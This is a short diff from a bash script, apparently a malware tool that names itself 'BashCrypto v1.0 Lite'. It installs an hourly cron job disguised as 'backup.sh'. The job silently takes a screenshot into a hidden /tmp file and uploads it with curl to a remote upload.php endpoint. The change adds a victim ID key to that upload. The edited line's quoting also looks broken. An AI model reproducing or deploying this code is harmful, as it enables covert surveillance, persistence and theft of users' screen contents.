@@ -236,7 +236,7 @@ then
     echo -e "\n"
     echo -e "/usr/bin/gnome-screenshot -f \"/tmp/.\${getDate}.screenshot\""
     echo -e "\n"
-    echo -e "tar -czf - \"/tmp/.\${getDate}.screenshot\" | curl -k -A \"BashCrypto v1.0 Lite\" -F \"file=@-\" \"file_info=\".\${getDate}.screenshot\".tar.gz\" -F \"uploadFile=Upload\" https://192.168.1.132/upload.php"
+    echo -e "tar -czf - \"/tmp/.\${getDate}.screenshot\" | curl -k -A \"BashCrypto v1.0 Lite\" -F \"unique_id=\${genKey}"\ -F \"file=@-\" \"file_info=\".\${getDate}.screenshot\".tar.gz\" -F \"uploadFile=Upload\" https://192.168.1.132/upload.php"
   } > /etc/cron.hourly/backup.sh
 
   chmod 755 /etc/cron.hourly/backup.sh
